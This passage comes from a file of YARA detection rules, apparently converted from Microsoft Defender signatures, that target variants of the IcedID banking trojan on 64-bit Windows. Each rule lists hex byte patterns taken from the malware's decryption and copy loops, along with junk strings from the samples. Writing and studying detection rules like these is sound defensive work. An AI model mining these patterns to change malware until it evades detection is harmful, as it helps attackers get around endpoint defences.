        $x_1_1 = {41 2b c8 83 e9 ?? 48 8b 94 24 ?? ?? ?? ?? 8b 84 02 ?? ?? ?? ?? 33 c1 b9 04 00 00 00 48 6b c9 00 48 8b 94 24 ?? ?? ?? ?? 89 84 0a ?? ?? ?? ?? b8 04 00 00 00 48 6b c0 00 b9 04 00 00 00 48 6b c9 01 48 8b 94 24 ?? ?? ?? ?? 4c 8b 84 24 ?? ?? ?? ?? 45 8b 40 3c 8b 4c 0a 7c 41 2b c8 48 8b 94 24 ?? ?? ?? ?? 8b 84 02 ?? ?? ?? ?? 0f af c1 b9 04 00 00 00 48 6b c9 00 48 8b 94 24 ?? ?? ?? ?? 89 84 0a ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MAZ_2147830910_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MAZ!MTB"
        threat_id = "2147830910"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = {2e 69 64 61 74 61 00 00 00 02 00 00 00 c0 00 00 00 02 00 00 00 96 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 68 79 74 00 00 00 00 5d 51 00 00 00 d0 00 00 00 52 00 00 00 98 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 2e 74 72 65}  //weight: 10, accuracy: High
        $x_1_2 = "BXeSkI4d5u" ascii //weight: 1
        $x_1_3 = "EFesnxuV" ascii //weight: 1
        $x_1_4 = "H7Gp0B04" ascii //weight: 1
        $x_1_5 = "K6fvcgRLMZ" ascii //weight: 1
        $x_1_6 = "U9mU5FrVBe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CC_2147831007_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CC!MTB"
        threat_id = "2147831007"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {4c 89 4c 24 20 4c 89 44 24 18 3a c9 74 00 48 89 54 24 10 48 89 4c 24 08}  //weight: 1, accuracy: High
        $x_1_2 = {44 89 4c 24 20 4c 89 44 24 18 3a e4}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AZ_2147831287_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AZ!MTB"
        threat_id = "2147831287"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b d0 33 c9 e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 8b 84 24 ?? ?? ?? ?? 66 ?? ?? 74 ?? 8b 4c 24 ?? 33 c8 66 ?? ?? 74 ?? b9 ?? ?? ?? ?? e8 ?? ?? ?? ?? 3a e4 74 ?? 48 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? ?? 66}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_AZ_2147831287_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.AZ!MTB"
        threat_id = "2147831287"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AbpnnnqfBHqHtmqwpxIZNEyZOZbWhjy" ascii //weight: 1
        $x_1_2 = "BFbVtCykrpfiOsqUWoYnLodzrTr" ascii //weight: 1
        $x_1_3 = "COJGHwyZtFmRGRZRcDtjmf" ascii //weight: 1
        $x_1_4 = "FFAhnjiehAUCUqmL" ascii //weight: 1
        $x_1_5 = "FImMtOoACjUDepEeBQuR" ascii //weight: 1
        $x_1_6 = "GwnGKuDroIwxmmuiIXJcBN" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RKP_2147831571_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RKP!MTB"
        threat_id = "2147831571"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {33 c8 8b c1 3a c0 74 01 c3 48 63 0c 24 48 8b 54 24 30 eb 0b 8b 44 24 38 39 04 24 7d 0a eb 43 88 04 0a e9}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EG_2147831939_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EG!MTB"
        threat_id = "2147831939"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_4_1 = {b8 2b 00 00 00 83 c0 3d 66 3b e4 74 0e 48 83 ec 58 b8 16 00 00 00 66 3b c9 74 0f 66 89 44 24 2a b8 3f 00 00 00 66 3b c9 74 49 83 c0 3d 66 89 44 24 28 66 3b c9 74 c9}  //weight: 4, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EG_2147831939_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EG!MTB"
        threat_id = "2147831939"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c8 f7 ea c1 fa ?? 89 c8 c1 f8 ?? 29 c2 89 d0 c1 e0 ?? 01 d0 c1 e0 ?? 29 c1 89 ca 48 63 d2 48 8b 85 ?? ?? ?? ?? 48 01 d0 0f b6 00 44 31 c8 41 88 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EG_2147831939_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EG!MTB"
        threat_id = "2147831939"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {44 89 4c 24 20 4c 89 44 24 18 3a e4 74 d6 b8 4d 00 00 00 83 c0 18 66 3b d2 74 00 66 89 44 24 52 b8 45 00 00 00 66 3b d2 74 35}  //weight: 3, accuracy: High
        $x_1_2 = "uisbadyugausbdjasyudjas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_EG_2147831939_3
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.EG!MTB"
        threat_id = "2147831939"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "uifnyasfbjauinyugasjas" ascii //weight: 1
        $x_1_2 = "dety5tpe2Rfbjiherage" wide //weight: 1
        $x_1_3 = "ReleaseSemaphore" ascii //weight: 1
        $x_1_4 = "CreateMutexW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BF_2147832538_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BF!MSR"
        threat_id = "2147832538"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "MhHkDOPAWDM" ascii //weight: 2
        $x_2_2 = "PAiVhgDeyOc" ascii //weight: 2
        $x_2_3 = "QKgKUNesBnvUxd" ascii //weight: 2
        $x_2_4 = "RbYburBSSkPkJ" ascii //weight: 2
        $x_2_5 = "TPejXjPeSufJbkq" ascii //weight: 2
        $x_2_6 = "UFSelludHufndu" ascii //weight: 2
        $x_2_7 = "empxFzgJqQSZoia" ascii //weight: 2
        $x_2_8 = "gVLOSxTuFdJoRLCp" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BG_2147832539_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BG!MSR"
        threat_id = "2147832539"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "AQyQncHqvRqxQY" ascii //weight: 2
        $x_2_2 = "ChGqRrBRhGfKUr" ascii //weight: 2
        $x_2_3 = "DpfvEkIUmArqVjNn" ascii //weight: 2
        $x_2_4 = "GZwcjmAfEtKGUVvS" ascii //weight: 2
        $x_2_5 = "KlvRgtSmhJZxdHv" ascii //weight: 2
        $x_2_6 = "NkbbycSBipi" ascii //weight: 2
        $x_2_7 = "RLroGWUkXmz" ascii //weight: 2
        $x_2_8 = "UGrYLPNnOQZWzoVn" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RH_2147832554_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RH!MTB"
        threat_id = "2147832554"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {89 c8 c1 f8 1f 29 c2 89 d0 6b c0 ?? 29 c1 89 c8 48 63 d0 48 8b 45 e8 48 01 d0 0f b6 00 44 31 c8 41 88 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_RDA_2147833884_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.RDA!MTB"
        threat_id = "2147833884"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = {89 c8 bd 1d 00 00 00 41 f7 ea 89 c8 c1 f8 1f 01 ca c1 fa 04 29 c2 89 c8 0f af d5 29 d0 48 63 d0 41 0f b6 14 10 41 32 14 0b 41 88 14 09 48 83 c1 01 48 81 f9 00 34 00 00 75}  //weight: 2, accuracy: High
        $x_2_2 = {89 c8 41 89 c9 41 f7 eb 41 c1 f9 1f 89 c8 01 ca c1 fa 04 44 29 ca 41 b9 1d 00 00 00 41 0f af d1 29 d0 48 63 d0 41 0f b6 14 10 32 14 0b 41 88 14 0a 48 83 c1 01 48 81 f9 2c 0a 00 00 75}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BA_2147833984_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BA!MTB"
        threat_id = "2147833984"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {48 89 4c 24 08 48 83 ec 28 eb 00 48 8b 44 24 30 48 89 44 24 08 eb 28 48 8b 44 24 08 48 ff c0 eb d3 8a 09 88 08 eb}  //weight: 3, accuracy: High
        $x_1_2 = "iyahsufygasufihkajskfuhasyhfaja" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BA_2147833984_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BA!MTB"
        threat_id = "2147833984"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b c1 0f b7 4c 24 ?? 3a d2 74 ?? 66 89 44 24 ?? 48 ?? ?? ?? ?? ?? ?? ?? 66 3b c9 74 ?? 33 c8 8b c1 66 3b c9 74}  //weight: 1, accuracy: Low
        $x_1_2 = {8b c0 3a ff 74 ?? 8b 44 24 ?? f7 b4 24 ?? ?? ?? ?? 66 3b c9 74 ?? 89 84 24 ?? ?? ?? ?? 33 d2 66 3b f6 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule Trojan_Win64_IcedID_BB_2147834005_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BB!MTB"
        threat_id = "2147834005"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b c1 33 86 ?? ?? ?? ?? 41 2b cb 01 86 ?? ?? ?? ?? 03 cf 01 8e ?? ?? ?? ?? 8b 8e ?? ?? ?? ?? 8b 86 ?? ?? ?? ?? 44 8b 96 ?? ?? ?? ?? 2b c2 05 ?? ?? ?? ?? 01 06 b8 ?? ?? ?? ?? 2b c1 2b c3 01 46 ?? 8d 41 ?? 31 86 ?? ?? ?? ?? 49 81 f9 ?? ?? ?? ?? 0f 8c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BB_2147834005_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BB!MTB"
        threat_id = "2147834005"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_3_1 = {48 8b 4c 24 30 48 8d 44 01 18 eb dd 48 8b 54 24 28 4c 8b 84 24 c0 01 00 00 66 3b f6 74 0d 48 8b c1 48 89 44 24 30 66 3b ed 74 1f 41 8a 04 00 88 04 0a e9}  //weight: 3, accuracy: High
        $x_1_2 = "yhaudijmdsifuhyasdijakdsmjdsuhfya" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_BB_2147834005_2
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.BB!MTB"
        threat_id = "2147834005"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 01 c0 44 01 e0 44 29 f8 48 98 32 14 06 48 8b 44 24 ?? 88 14 38 48 39 5c 24 ?? 48 8d 43 01 48 89 44 24 ?? 8b 0d ?? ?? ?? ?? 44 8b 15 ?? ?? ?? ?? 44 8b 05 ?? ?? ?? ?? 44 8b 0d ?? ?? ?? ?? 44 8b 1d ?? ?? ?? ?? 8b 35 ?? ?? ?? ?? 89 c8 44 89 d7 41 0f af c2}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_LEH_2147834453_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.LEH!MTB"
        threat_id = "2147834453"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 44 24 20 8b 4c 24 ?? 66 3b c9 74 ?? 48 8b 4c 24 ?? 48 03 c8 3a c9 74 ?? 48 89 44 24 ?? c7 44 24 20 ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
        $x_1_2 = {48 8b 54 24 ?? 4c 8b 84 24 ?? ?? ?? ?? 66 3b f6 74 ?? 48 8b c1 48 89 44 24 ?? 66 3b ed 74 ?? 41 8a 04 00 88 04 0a e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SB_2147834597_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SB!MTB"
        threat_id = "2147834597"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 0c 81 31 0a 49 8b 40 ?? 48 ?? ?? ?? ?? ?? ?? 48 81 c9 ?? ?? ?? ?? 49 09 48 ?? 41 8b 88 ?? ?? ?? ?? 81 e1 ?? ?? ?? ?? 7d}  //weight: 1, accuracy: Low
        $x_1_2 = {49 8b 40 70 41 ?? ?? ?? ?? ?? ?? 49 39 40 ?? 72 ?? 49 81 88 ?? ?? ?? ?? ?? ?? ?? ?? 41 ff c2 45 3b ?? ?? ?? ?? ?? 0f 8c}  //weight: 1, accuracy: Low
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SD_2147834781_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SD!MTB"
        threat_id = "2147834781"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 44 24 7c 41 b9 04 00 00 00 41 b8 00 30 00 00 8b d0 33 c9 ff 94 24}  //weight: 1, accuracy: High
        $x_1_2 = {48 8b c1 0f b6 44 04 ?? 8b 8c 24 ?? ?? ?? ?? 33 c8 8b c1 48 63 4c 24 ?? 48 8b 54 24 ?? 88 04 0a e9}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SD_2147834781_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SD!MTB"
        threat_id = "2147834781"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {44 8d 04 16 83 e2 ?? 41 83 e0 ?? 8a 44 94 ?? 42 02 44 84 ?? 41 32 04 3b 41 88 04 0b 4c 03 de 42 8b 4c 84 ?? 8b 44 94 ?? 83 e1 ?? d3 c8 ff c0 89 44 94}  //weight: 1, accuracy: Low
        $x_1_2 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SE_2147834845_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SE!MTB"
        threat_id = "2147834845"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 0c 81 31 0a 49 8b 88 ?? ?? ?? ?? 49 ?? ?? 48 ?? ?? ?? 49 ?? ?? 41 8b 88 ?? ?? ?? ?? 81 e1}  //weight: 1, accuracy: Low
        $x_1_2 = {49 8b 88 d0 ?? ?? ?? 48 35 ?? ?? ?? ?? 48 29 81 ?? ?? ?? ?? 41 ?? ?? ?? ?? ?? ?? ff c0 ?? 41 f7 b8 ?? ?? ?? ?? 41}  //weight: 1, accuracy: Low
        $x_1_3 = "DllRegisterServer" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SF_2147834925_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SF!MTB"
        threat_id = "2147834925"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 63 0c 24 48 ?? ?? ?? ?? ?? ?? ?? eb 10 0f b6 04 01 8b 4c 24 ?? eb ?? 33 c8 8b c1 eb ?? 88 04 0a e9 ?? ?? ?? ?? 48 ?? ?? ?? ?? ?? ?? eb ?? 8b 84 24 ?? ?? ?? ?? 39 04 24 7d}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_NWT_2147835005_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.NWT!MTB"
        threat_id = "2147835005"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 8a 04 00 88 04 0a e9 ?? ?? ?? ?? e9 ?? ?? ?? ?? 48 8b 4c 24 30 48 8d 44 01 18 eb ?? 41 81 c0 d5 00 00 00 8b d0 3a db 74 ?? 8b 44 24 20 8b 4c 24 20 3a d2 74 ?? 48 8b 54 24 28 4c 8b 84 24 c0 01 00 00 3a c0 74}  //weight: 1, accuracy: Low
        $x_1_2 = {71 73 4b 2e 64 6c 6c 00 42 5a 7a 6f 62 48 4f 67 4e 7a 6f 59 00 4a 62 61 64 73 6a 61 73 66 6b 73 00 5a 4c}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_SG_2147835051_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.SG!MTB"
        threat_id = "2147835051"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 8b 8c 24 ?? ?? ?? ?? eb ?? f7 bc 24 ?? ?? ?? ?? 8b c2 eb ?? 33 c8 8b c1 eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MXM_2147835063_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MXM!MTB"
        threat_id = "2147835063"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 04 24 99 eb ?? 33 c8 8b c1 eb ?? 48 98 48 8b 8c 24 ?? ?? ?? ?? eb ?? 0f b6 04 01 8b 4c 24 60 eb}  //weight: 1, accuracy: Low
        $x_1_2 = {8b 84 24 08 ?? ?? ?? 39 04 24 7d ?? eb ?? 88 04 0a eb ?? 48 81 c4 f8 00 00 00 e9 ?? ?? ?? ?? c7 04 24}  //weight: 1, accuracy: Low
        $x_1_3 = "Wgjasbhaj" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_PS_2147835118_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.PS!MTB"
        threat_id = "2147835118"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 8b 8c 24 ?? ?? ?? ?? eb 00 33 c8 8b c1 eb 21 48 98 48 8b 8c 24 ?? ?? ?? ?? eb e1 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb 31 48 63 0c 24 48 8b 94 24 ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
        $x_1_2 = {88 04 0a e9}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_FYI_2147835152_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.FYI!MTB"
        threat_id = "2147835152"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {f7 bc 24 18 ?? ?? ?? 8b c2 eb ?? 33 c8 8b c1 eb ?? 48 63 0c 24 48 8b 94 24 ?? ?? ?? ?? e9 9b}  //weight: 5, accuracy: Low
        $x_5_2 = {ff c0 89 04 ?? eb 24 80 44 24 4a ?? c6 44 24 4b ?? eb ?? 80 44 24 50 ?? c6 44 24 51 ?? eb ?? 80 44 24 4f ?? c6 44 24 50 ?? eb}  //weight: 5, accuracy: Low
        $x_1_3 = "Hbashfkjas" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_MSD_2147835254_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.MSD!MTB"
        threat_id = "2147835254"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {0f b6 04 01 8b 8c 24 ?? ?? ?? ?? eb 15}  //weight: 1, accuracy: Low
        $x_1_2 = {33 c8 8b c1 eb a6}  //weight: 1, accuracy: High
        $x_1_3 = {48 63 0c 24 48 8b 94 24 ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
        $x_1_4 = {88 04 0a e9}  //weight: 1, accuracy: High
        $x_1_5 = "Unsadjkbasf" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win64_IcedID_CDS_2147835255_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win64/IcedID.CDS!MTB"
        threat_id = "2147835255"
        type = "Trojan"
        platform = "Win64: Windows 64-bit platform"
        family = "IcedID"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 ff c0 48 ?? ?? ?? 10 eb ?? eb ?? 8a 09 88 08 eb ?? 48 89 44 24 ?? 48 8b 44 24 ?? eb}  //weight: 1, accuracy: Low
        $x_1_2 = {33 c8 8b c1 eb ?? f7 bc 24 ?? ?? ?? ?? 8b c2 eb ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? eb ?? 48 63 0c 24 48 8b 94 24 ?? ?? ?? ?? e9 ?? ?? ?? ?? 83 84 24 ?? ?? ?? ?? ?? c7 84 24 ?? ?? ?? ?? ?? ?? ?? ?? e9}  //weight: 1, accuracy: Low
